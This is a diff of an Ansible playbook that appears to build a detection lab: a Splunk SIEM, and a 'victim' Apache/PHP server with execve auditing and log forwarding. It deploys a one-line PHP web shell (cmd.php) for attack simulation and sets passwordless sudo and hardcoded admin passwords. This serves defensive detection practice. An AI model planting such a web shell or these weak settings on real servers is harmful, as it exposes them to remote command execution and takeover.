@@ -1,25 +1,28 @@
 ---
+# ==============================================================================
+# SECTION 4: INFRASTRUCTURE & ARCHITECTURE PROVISIONING (Splunk SIEM & Web Server)
+# ==============================================================================
 - name: Configure Splunk Enterprise (SIEM)
   hosts: splunk
   become: yes
   tasks:
-    - name: Download Splunk installer directly to the VM
+    - name: [Section 4] Download Splunk installer directly to the VM
       get_url:
         url: "https://download.splunk.com/products/splunk/releases/10.6.1.1/linux/splunk-10.6.1.1-b2ae2962645c-linux-amd64.deb"
         dest: /tmp/splunk.deb
 
-    - name: Install Splunk Enterprise from the downloaded .deb
+    - name: [Section 4] Install Splunk Enterprise from the downloaded .deb
       apt:
         deb: /tmp/splunk.deb
-    
-    - name: Ensure correct ownership for Splunk directory
+
+    - name: [Section 4] Ensure correct ownership for Splunk directory
       file:
         path: /opt/splunk
         owner: splunk
         group: splunk
         recurse: yes
 
-    - name: Create admin credentials so it doesn't hang
+    - name: [Section 4] Create admin credentials so it doesn't hang
       copy:
         dest: /opt/splunk/etc/system/local/user-seed.conf
         content: |
@@ -27,39 +30,40 @@
           USERNAME = admin
           PASSWORD = deia_password_123!
 
-    - name: Start Splunk and accept license
+    - name: [Section 4] Start Splunk and accept license
       command: /opt/splunk/bin/splunk start --accept-license --answer-yes --no-prompt --run-as-root
       args:
         creates: /opt/splunk/etc/auth/splunk.secret
 
-    - name: Enable Splunk boot-start for splunk user
+    - name: [Section 4] Enable Splunk boot-start for splunk user
       command: /opt/splunk/bin/splunk enable boot-start -user splunk
 
-    - name: Enable receiver port 9997
+    - name: [Section 4] Enable receiver port 9997
       command: /opt/splunk/bin/splunk enable listen 9997 -auth admin:deia_password_123! --run-as-root
       ignore_errors: yes
 
-    - name: Create linux index
+    - name: [Section 4] Create linux index
       command: /opt/splunk/bin/splunk add index linux -auth admin:deia_password_123! --run-as-root
       ignore_errors: yes
+
 
 - name: Configure Web Server (Victim)
   hosts: webserver
   become: yes
   tasks:
-    - name: Fix local hostname resolution for sudo
+    - name: [Section 4] Fix local hostname resolution for sudo
       lineinfile:
         path: /etc/hosts
         line: "127.0.1.1 {{ ansible_hostname }}"
         state: present
 
-    - name: Enable passwordless sudo for webserver_deia
+    - name: [Section 4] Enable passwordless sudo for webserver_deia
       copy:
         dest: /etc/sudoers.d/webserver_deia
         content: "webserver_deia ALL=(ALL) NOPASSWD: ALL"
         mode: '0440'
 
-    - name: Install Apache, PHP, and utilities
+    - name: [Section 4] Install Apache, PHP, and utilities
       apt:
         name:
           - apache2
@@ -71,14 +75,20 @@
         state: present
         update_cache: yes
 
-    - name: Deploy cmd.php web shell
+    # ==============================================================================
+    # SECTION 6: ATTACK SIMULATION & WEB SHELL SETUP
+    # ==============================================================================
+    - name: [Section 6] Deploy cmd.php web shell
       copy:
         dest: /var/www/html/cmd.php
         content: '<?php system($_GET["c"]); ?>'
         owner: www-data
         mode: '0644'
 
-    - name: Configure audit rules to monitor process execution (execve)
+    # ==============================================================================
+    # SECTION 5: TELEMETRY PIPELINE SETUP (Auditd, Laurel, & Universal Forwarder)
+    # ==============================================================================
+    - name: [Section 5] Configure audit rules to monitor process execution (execve)
       copy:
         dest: /etc/audit/rules.d/deia.rules
         content: |
@@ -88,28 +98,36 @@
           -a always,exit -F arch=b64 -S execve -F key=exec
           -a always,exit -F arch=b32 -S execve -F key=exec
 
-    - name: Apply audit rules and restart auditd
+    - name: [Section 5] Apply audit rules and restart auditd
       shell: augenrules --load && systemctl restart auditd
 
-    - name: Download Splunk Universal Forwarder directly to web server
+    - name: [Section 5] Download Splunk Universal Forwarder directly to web server
       get_url:
         url: "https://download.splunk.com/products/universalforwarder/releases/10.6.1.1/linux/splunkforwarder-10.6.1.1-b2ae2962645c-linux-amd64.deb"
         dest: /tmp/splunkforwarder.deb
 
-    - name: Install Splunk Universal Forwarder .deb
+    - name: [Section 5] Install Splunk Universal Forwarder .deb
       apt:
         deb: /tmp/splunkforwarder.deb
 
-    - name: Accept license and start Universal Forwarder
+    - name: [Section 5] Create admin seed for Universal Forwarder so it doesn't fail auth
+      copy:
+        dest: /opt/splunkforwarder/etc/system/local/user-seed.conf
+        content: |
+          [user_info]
+          USERNAME = admin
+          PASSWORD = deia_password_123!
+
+    - name: [Section 5] Accept license and start Universal Forwarder
       command: /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --run-as-root
       args:
         creates: /opt/splunkforwarder/etc/auth/splunk.secret
 
-    - name: Configure forwarder to point to Splunk SIEM (192.168.201.129:9997)
-      command: /opt/splunkforwarder/bin/splunk add forward-server 192.168.201.129:9997 -auth admin:deia_password_123!
+    - name: [Section 5] Configure forwarder to point to Splunk SIEM (192.168.201.131:9997)
+      command: /opt/splunkforwarder/bin/splunk add forward-server 192.168.201.131:9997 -auth admin:deia_password_123!
       ignore_errors: yes
 
-    - name: Configure inputs.conf to read Laurel logs
+    - name: [Section 5] Configure inputs.conf to read Laurel logs
       copy:
         dest: /opt/splunkforwarder/etc/system/local/inputs.conf
         content: |
@@ -117,6 +135,6 @@
           index = linux
           sourcetype = laurel
 
-    - name: Restart Splunk Universal Forwarder
+    - name: [Section 5] Restart Splunk Universal Forwarder
       command: /opt/splunkforwarder/bin/splunk restart --run-as-root
       ignore_errors: yes
